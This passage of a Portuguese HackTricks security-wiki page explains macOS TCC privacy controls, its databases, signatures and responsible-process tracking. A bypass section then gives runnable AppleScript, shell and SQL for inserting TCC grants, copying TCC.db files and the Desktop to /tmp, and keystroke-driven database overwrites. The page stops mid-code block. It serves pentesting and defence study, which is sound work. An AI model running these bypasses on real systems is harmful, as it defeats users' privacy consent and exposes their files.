# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Informações básicas**

**TCC (Transparency, Consent, and Control)** é um protocolo de segurança que se concentra em regular as permissões de aplicativos. Sua principal função é proteger recursos sensíveis, como **serviços de localização, contatos, fotos, microfone, câmera, acessibilidade e acesso total ao disco**. Ao exigir o consentimento explícito do usuário antes de conceder acesso do aplicativo a esses recursos, o TCC aprimora a privacidade e o controle do usuário sobre seus dados.

Os usuários encontram o TCC quando os aplicativos solicitam acesso a recursos protegidos. Isso fica visível por meio de um prompt que permite aos usuários **aprovar ou negar o acesso**. Além disso, o TCC permite ações diretas do usuário, como **arrastar e soltar arquivos em um aplicativo**, para conceder acesso a arquivos específicos, garantindo que os aplicativos tenham acesso somente ao que foi explicitamente permitido.

![Um exemplo de prompt do TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

O **TCC** é gerenciado pelo **daemon** localizado em `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` e configurado em `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registrando o serviço mach `com.apple.tccd.system`).

Há um **tccd em modo de usuário** em execução para cada usuário conectado, definido em `/System/Library/LaunchAgents/com.apple.tccd.plist`, que registra os serviços mach `com.apple.tccd` e `com.apple.usernotifications.delegate.com.apple.tccd`.

Aqui você pode ver o tccd em execução como sistema e como usuário:

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

As permissões são **herdadas do aplicativo pai** e são **rastreadas** com base no **Bundle ID** e no **Developer ID**.

### Bancos de dados TCC

As permissões concedidas/negadas são armazenadas em alguns bancos de dados TCC:

- O banco de dados de todo o sistema em **`/Library/Application Support/com.apple.TCC/TCC.db`**.
  - Esse banco de dados é **protegido pelo SIP**, portanto, só é possível gravar nele contornando o SIP.
- O banco de dados TCC do usuário **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**, para preferências por usuário.
  - Esse banco de dados é protegido, portanto, apenas processos com privilégios TCC elevados, como Full Disk Access, podem gravar nele (mas ele não é protegido pelo SIP).

> [!WARNING]
> Os bancos de dados anteriores também são **protegidos pelo TCC contra leitura**. Portanto, você **não poderá ler** o banco de dados TCC do seu usuário comum, a menos que a leitura seja feita por um processo com privilégios TCC.
>
> No entanto, lembre-se de que um processo com esses privilégios elevados (como **FDA** ou **`kTCCServiceEndpointSecurityClient`**) poderá gravar no banco de dados TCC do usuário.

- Há um **terceiro** banco de dados TCC em **`/var/db/locationd/clients.plist`** que indica os clientes com permissão para **acessar os serviços de localização**.
- **`/Library/Application Support/com.apple.TCC/REG.db`** registra os caminhos dos bancos de dados TCC registrados. Um banco de dados de usuário plantado pode ser rejeitado, a menos que esteja registrado; conhecer apenas esse caminho não concede acesso a nenhum dos bancos de dados.<sup>[[6]](#references)</sup>
- **`/Library/Application Support/com.apple.TCC/MDMOverrides.plist`** contém decisões de Privacy Preferences Policy Control (PPPC) gerenciadas. Verifique-o quando um aplicativo tiver uma permissão gerenciada que não esteja presente nas linhas comuns de `access`.<sup>[[7]](#references)</sup>
- O arquivo protegido pelo SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (mas legível por qualquer pessoa) é uma lista de permissões de aplicativos que exigem uma exceção do TCC.

> [!TIP]
> O banco de dados TCC no **iOS** fica em **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> A **interface do Notification Center** pode fazer **alterações no banco de dados TCC do sistema**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
> No entanto, os usuários podem **redefinir regras** com o utilitário de linha de comando **`tccutil`**; ele não tem uma operação de consulta documentada.<sup>[[4]](#references)</sup>

#### Consultar os bancos de dados

{{#tabs}}
{{#tab name="user DB"}}

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}

{{#tab name="system DB"}}

```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> Consultando ambos os bancos de dados, você pode verificar as permissões que um app permitiu, proibiu ou ainda não tem (ele solicitará a permissão).

- **`service`** é a representação em string da **permissão** do TCC
- **`client`** é o **bundle ID** ou o **caminho para o binário** que tem as permissões
- **`client_type`** indica se é um Bundle Identifier (0) ou um caminho absoluto (1)

<details>

<summary>Como executar se for um caminho absoluto</summary>

Basta executar **`launctl load you_bin.plist`**, com um plist como:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

- **`auth_value`** pode ter valores diferentes: denied(0), unknown(1), allowed(2) ou limited(3).
- **`auth_reason`** pode assumir os seguintes valores: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- O campo **csreq** indica como verificar o binário a ser executado e conceder as permissões do TCC:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

- Para obter mais informações sobre os **outros campos** da tabela, [**confira esta publicação no blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Você também pode verificar as permissões **já concedidas** aos apps em `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Os usuários podem **redefinir** regras usando **`tccutil`**, mas precisam inspecionar os bancos de dados para consultar as concessões.<sup>[[4]](#references)</sup>

#### Redefinir permissões do TCC

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

#### Identificar as permissões de remetente e alvo do Apple Events

Uma permissão de Automação é uma decisão de **remetente para alvo**, não uma permissão para controlar todos os apps. Com acesso ao banco de dados do usuário, enumere os pares de remetente/alvo permitidos antes de tentar os fluxos de trabalho do [Apple Events](macos-apple-events.md) ou do Finder abaixo. `csreq` identifica o remetente e `indirect_object_code_identity` identifica o alvo; decodifique qualquer blob não nulo usando o método `csreq` acima.<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, indirect_object_identifier AS target, \
          hex(csreq) AS sender_req, \
          hex(indirect_object_code_identity) AS target_req \
   FROM access WHERE service='kTCCServiceAppleEvents' AND auth_value=2;"
```

### Verificações de assinatura do TCC

O **banco de dados** do TCC armazena o **Bundle ID** do aplicativo, mas também **armazena** **informações** sobre a **assinatura** para **garantir** que o app que solicita usar uma permissão seja o correto.

```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```

> [!WARNING]
> Portanto, outros aplicativos que usem o mesmo nome e bundle ID não poderão acessar as permissões concedidas a outros apps.

### Entitlements e permissões do TCC

Uma concessão do TCC não substitui as restrições do **App Sandbox**. Um cliente de câmera em sandbox precisa de `com.apple.security.device.camera`; a Apple também disponibiliza esse recurso para apps com Hardened Runtime. Nenhum desses entitlements ignora o prompt separado de consentimento do usuário. Não considere o entitlement do sandbox um pré-requisito incondicional para todos os processos sem sandbox. Quando uma solicitação falhar, verifique os entitlements do executável e o app responsável.<sup>[[8]](#references)[[9]](#references)</sup>

Observe que os entitlements são arquivos plist e fazem parte do code sig; eles recebem hashes adicionais no code sig por meio de slots especiais e podem ser consultados no kernel pelo código do kernel ou pelo código em modo de usuário usando `csops(#169)` ou `csops_audittoken(#170)`.

No entanto, para **acessar** **determinadas pastas do usuário**, como `~/Desktop`, `~/Downloads` e `~/Documents`, os apps **não precisam** de nenhum **entitlement** específico. O sistema tratará o acesso de forma transparente e **solicitará a autorização do usuário** quando necessário.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Os apps da Apple **não geram prompts**. Eles contêm **direitos pré-concedidos** na lista de **entitlements**, o que significa que **nunca exibirão um popup**, **nem** aparecerão em qualquer um dos **bancos de dados do TCC**. Por exemplo:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

Isso impedirá que o Calendar peça ao usuário acesso a lembretes, ao calendário e à agenda de contatos.

> [!TIP]
> Além de algumas documentações oficiais sobre entitlements, também é possível encontrar **informações interessantes não oficiais sobre entitlements em** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Algumas permissões do TCC são: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Não há uma lista pública que defina todas elas, mas você pode consultar esta [**lista das conhecidas**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Locais sensíveis desprotegidos

- $HOME (em si)
- $HOME/.ssh, $HOME/.aws, etc
- /tmp

### Intenção do usuário / com.apple.macl

Como mencionado anteriormente, é possível **conceder acesso de um App a um arquivo arrastando-o e soltando-o sobre o App**. Esse acesso não será especificado em nenhum banco de dados do TCC, mas sim como um **atributo estendido** **do arquivo**. Esse atributo **armazenará o UUID** do App autorizado:<sup>[[2]](#references)</sup>

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

> [!TIP]
> É curioso que o atributo **`com.apple.macl`** seja gerenciado pelo **Sandbox**, não pelo tccd.
>
> Observe também que, se você mover para outro computador um arquivo que permite o UUID de um app do seu computador, como o mesmo app terá UIDs diferentes, ele não concederá acesso a esse app.

O atributo estendido `com.apple.macl` **não pode ser limpo** como outros atributos estendidos porque é **protegido pelo SIP**. No entanto, como [**explicado nesta publicação**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), é possível desativá-lo **compactando** o arquivo em um zip, **excluindo-o** e **descompactando-o**.<sup>[[3]](#references)</sup>






## Mecanismo de processo responsável do XNU

No macOS/iOS, o mecanismo de **processo responsável** é um recurso de segurança essencial usado pelo framework **TCC (Transparency, Consent, and Control)** e por outros sistemas de segurança para rastrear qual processo é, em última análise, responsável por uma ação, mesmo através de cadeias de processos filhos.

Quando o TCC verifica permissões (por exemplo, para câmera, microfone ou localização), nem sempre verifica o processo imediato que faz a solicitação. Em vez disso, verifica o **processo responsável** — normalmente, o aplicativo GUI que iniciou a ação, mesmo que a solicitação real venha de um processo auxiliar ou daemon.

Para identificar o app realmente atribuído a uma solicitação, transmita as mensagens `AttributionChain` do TCC enquanto aciona a operação protegida. Isso é mais confiável do que conceder acesso ao executável auxiliar apenas porque ele fez a chamada à API. Compare a identidade informada com o ID do bundle ou o caminho e o requisito de assinatura na linha `access` relevante.<sup>[[10]](#references)</sup>

```bash
log stream --debug --predicate 'subsystem == "com.apple.TCC" AND eventMessage BEGINSWITH "AttributionChain"'
```

<details>
<summary>Como o processo responsável é definido</summary>

### Campos da estrutura do processo

Cada processo no XNU mantém dois identificadores UUID principais:

```c
// From bsd/sys/proc_internal.h
struct proc {
    // ...
    pid_t   p_responsible_pid;          // PID of the responsible process
    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
    uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
    // ...
};
```

- **`p_uuid`**: O UUID do próprio processo (do comando de carregamento `LC_UUID` do binário Mach-O)
- **`p_responsible_pid`**: O PID do processo responsável
- **`p_responsible_uuid`**: O UUID do processo responsável (persiste mesmo após o encerramento desse processo)

### Como o processo responsável é definido

1. **Durante a criação do processo (Fork)**

Quando um novo processo é criado por meio de `fork()` ou `posix_spawn()`, o processo responsável é herdado do processo pai (a syscall `exec()` reutiliza a estrutura `proc` existente, portanto, essa etapa não se repete nesse caso):

**Localização**: `bsd/kern/kern_fork.c:1053`

```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```

**Pontos principais:**
- Os processos filhos **herdam** o `p_responsible_pid` do processo pai
- Isso cria uma **cadeia de responsabilidade** na hierarquia de processos
- O processo responsável geralmente aponta para o aplicativo GUI original

2. **A função principal: `proc_set_responsible_pid()`**

**Localização**: `bsd/kern/kern_proc.c:4817-4831`

```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
    target_proc->p_responsible_pid = responsible_pid;
    
    if (responsible_pid >= 0) {
        proc_t responsible_proc = proc_find(responsible_pid);
        if (responsible_proc != PROC_NULL) {
            // Copy the responsible process's UUID for persistent identification
            proc_getexecutableuuid(responsible_proc, 
                target_proc->p_responsible_uuid, 
                sizeof(target_proc->p_responsible_uuid));
            proc_rele(responsible_proc);
        }
    }
    return;
}
```

**O que esta função faz:**
1. **Define o PID responsável** no processo de destino
2. **Procura o processo responsável** usando `proc_find()` (incrementa a contagem de referências)
3. **Copia o UUID** de `p_uuid` do processo responsável para `p_responsible_uuid` do processo de destino
4. **Libera a referência** com `proc_rele()` (decrementa a contagem de referências)

3. **Por que armazenar o PID e o UUID?**

A abordagem de armazenamento duplo resolve um problema crítico:

| Campo | Finalidade | Problema | Solução |
|-------|------------|----------|---------|
| `p_responsible_pid` | Consulta rápida do processo atual | O PID pode ser reutilizado após o encerramento do processo | Usado para consultar processos ativos |
| `p_responsible_uuid` | Identificação persistente | Persiste após o encerramento do processo | Usado em verificações de segurança e auditoria |

**O problema**: se o processo responsável terminar antes do processo filho, o PID poderá ser reciclado e atribuído a um processo completamente diferente.

**A solução**: o UUID é imutável e identifica exclusivamente o binário específico que era responsável, mesmo após seu encerramento.

### Fluxo de criação do processo

```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ fork() / posix_spawn()
                      ▼
         ┌────────────────────────────┐
         │ kern_fork.c:fork1_internal │
         │                            │
         │ proc_set_responsible_pid(  │
         │   child_proc,              │
         │   parent->p_responsible_pid│
         │ );                         │
         └────────────┬───────────────┘
                      │
                      ▼
         ┌────────────────────────────┐
         │ proc_set_responsible_pid() │
         │                            │
         │ 1. Set p_responsible_pid   │
         │ 2. Find responsible proc   │
         │ 3. Copy UUID               │
         │ 4. Release reference       │
         └────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```

### Origem do UUID: comando de carregamento LC_UUID

O UUID armazenado em `p_uuid` vem do **comando de carregamento `LC_UUID` do executável Mach-O**:

1. **Tempo de compilação**

```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```

2. **Tempo de execução**

**Localização**: `bsd/kern/mach_loader.c:2393-2413`

```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
    if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
        (((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
        return LOAD_BADMACHO;
    }

    // Extract UUID from LC_UUID load command
    memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
    return LOAD_SUCCESS;
}
```

3. **Armazenado na estrutura do processo**

**Localização**: `bsd/kern/kern_exec.c:2281`

```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```

**Location**: `bsd/kern/kern_proc.c:1912-1915`

```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
    memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Inserir no TCC

Se em algum momento você conseguir acesso de escrita a um banco de dados TCC, poderá usar algo como o exemplo a seguir para adicionar uma entrada (remova os comentários):

<details>

<summary>Exemplo de inserção no TCC</summary>

```sql
INSERT INTO access (
    service,
    client,
    client_type,
    auth_value,
    auth_reason,
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified,
    pid,
    pid_version,
    boot_uuid,
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### Payloads de TCC

Se você conseguiu entrar em um app com algumas permissões de TCC, consulte a página a seguir sobre payloads de TCC para abusar delas:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Saiba mais sobre Apple Events em:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) para FDA\*

O nome TCC da permissão Automation é: **`kTCCServiceAppleEvents`**\
Essa permissão TCC específica também indica o **aplicativo que pode ser gerenciado** no banco de dados do TCC (ou seja, as permissões não permitem gerenciar tudo).

O **Finder** é um aplicativo que **sempre tem FDA** (mesmo que isso não apareça na interface), então, se você tiver privilégios de **Automation** sobre ele, poderá abusar desses privilégios para **fazê-lo executar algumas ações**.\
Neste caso, seu app precisaria da permissão **`kTCCServiceAppleEvents`** sobre **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}

```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}

{{#tab name="Steal systems TCC.db"}}

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}
{{#endtabs}}

Uma variante de gravação relatada, quando há um caminho de Automation para o Finder, consiste em fazer o Finder **renomear o diretório `com.apple.TCC` do usuário**. Em seguida, o banco de dados no caminho renomeado era copiado para um diretório de staging, modificado nesse local, copiado de volta, e o nome do diretório era restaurado. A nova linha `kTCCServiceAppleEvents` deve identificar **tanto o binário remetente quanto o Finder**, incluindo os requisitos de código de ambos; conceder permissão ao remetente sem a identidade do destino não é equivalente. Esta técnica depende do caminho, portanto, verifique-a na versão de macOS alvo em vez de presumir que a Automation do Finder, por si só, concede gravação arbitrária no banco de dados.<sup>[[11]](#references)</sup>

> [!WARNING]
> Com essa permissão, você poderá **pedir ao Finder para acessar pastas restritas pelo TCC** e fornecer os arquivos, mas, até onde sei, **não poderá fazer o Finder executar código arbitrário** para abusar totalmente do acesso FDA dele.
>
> Portanto, você não poderá abusar de todos os recursos do FDA.

Este é o prompt do TCC para obter privilégios de Automation sobre o Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Observe que, como o app **Automator** tem a permissão TCC **`kTCCServiceAppleEvents`**, ele pode **controlar qualquer app**, como o Finder. Portanto, com a permissão para controlar o Automator, você também poderia controlar o **Finder** com um código como o abaixo:

<details>

<summary>Obter um shell dentro do Automator</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

O mesmo acontece com o **app Script Editor**: ele pode controlar o Finder, mas, usando um AppleScript, você não pode forçá-lo a executar um script.

### Automação (SE) para alguns TCC

**O System Events pode criar Folder Actions, e as Folder Actions podem acessar algumas pastas do TCC** (Desktop, Documents e Downloads), então um script como o seguinte pode ser usado para abusar desse comportamento:

```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
    -- Ensure Folder Actions are enabled
    set folder actions enabled to true

    -- Define the path to the folder and the script
    set homeFolder to path to home folder as text
    set folderPath to homeFolder & "Desktop"
    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

    -- Create or get the Folder Action for the Desktop
    if not (exists folder action folderPath) then
        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
    end if
    set myFolderAction to folder action folderPath

    -- Attach the script to the Folder Action
    if not (exists script scriptPath of myFolderAction) then
        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
    end if

    -- Enable the Folder Action and the script
    enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```

### Automação (SE) + Acessibilidade (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**) para FDA*

A Automação no **`System Events`** + Acessibilidade (**`kTCCServicePostEvent`**) permite enviar **pressionamentos de tecla aos processos**. Dessa forma, você poderia abusar do Finder para alterar o TCC.db do usuário ou conceder FDA a um app arbitrário (embora uma senha possa ser solicitada para isso).

Exemplo de sobrescrita do TCC.db do usuário pelo Finder:

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
    -- Open Finder
    tell application "Finder" to activate

    -- Open the /tmp directory
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke "/tmp"
    delay 1
    keystroke return
    delay 1

    -- Select and copy the file
    keystroke "TCC.db"
    delay 1
    keystroke "c" using {command down}
    delay 1

    -- Resolve $HOME environment variable
    set homePath to system attribute "HOME"

    -- Navigate to the Desktop directory under $HOME
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke homePath & "/Library/Application Support/com.apple.TCC"
    delay 1
    keystroke return
    delay 1

    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
    keystroke "TCC.db"
    delay 1
    keystroke return
    delay 1
    key code 51 using {command down}
    delay 1

    -- Paste the file
    keystroke "v" using {command down}
end tell
EOF
```

### `kTCCServiceAccessibility` para FDA\*

Confira esta página para ver alguns [**payloads para abusar das permissões de Accessibility**](macos-tcc-payloads.md#accessibility) e escalar privilégios para FDA\* ou, por exemplo, executar um keylogger.

### **Endpoint Security Client para FDA**

Se você tiver **`kTCCServiceEndpointSecurityClient`**, terá FDA. Fim.

### System Policy SysAdmin File para FDA

**`kTCCServiceSystemPolicySysAdminFiles`** permite **alterar** o atributo **`NFSHomeDirectory`** de um usuário, mudando sua pasta pessoal e, assim, permitindo **contornar o TCC**.<sup>[[5]](#references)</sup>

### Banco de dados TCC do usuário para FDA

Obter **permissões de gravação** no banco de dados **TCC do usuário** não permite conceder a si mesmo permissões de **`FDA`**; somente o banco de dados do sistema pode concedê-las.

Mas você pode conceder a si mesmo **direitos de Automation sobre o Finder** e abusar da técnica anterior para escalar para FDA\*.

### **FDA para permissões TCC**

O nome TCC para **Full Disk Access** é **`kTCCServiceSystemPolicyAllFiles`**.

Não acho que isso seja uma escalada real de privilégios, mas, caso seja útil: se você controlar um programa com FDA, poderá **modificar o banco de dados TCC do usuário e conceder a si mesmo qualquer acesso**. Isso pode ser útil como técnica de persistência, caso você perca suas permissões de FDA.

### **SIP Bypass para contornar o TCC**

O **banco de dados TCC** do sistema é protegido pelo **SIP**; por isso, somente processos com os **entitlements indicados poderão modificá-lo**. Portanto, se um atacante encontrar um **SIP bypass** em um **arquivo** (conseguir modificar um arquivo protegido pelo SIP), poderá:

- **Remover a proteção** de um banco de dados TCC e conceder a si mesmo todas as permissões TCC. Por exemplo, ele poderia abusar de qualquer um destes arquivos:
  - O banco de dados TCC do sistema
  - REG.db
  - MDMOverrides.plist

No entanto, há outra opção para abusar desse **SIP bypass para contornar o TCC**: o arquivo `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` é uma lista de permissões de aplicativos que precisam de uma exceção do TCC. Portanto, se um atacante puder **remover a proteção SIP** desse arquivo e adicionar seu **próprio aplicativo**, o aplicativo poderá contornar o TCC.\
Por exemplo, para adicionar o terminal:

```bash
# Get needed info
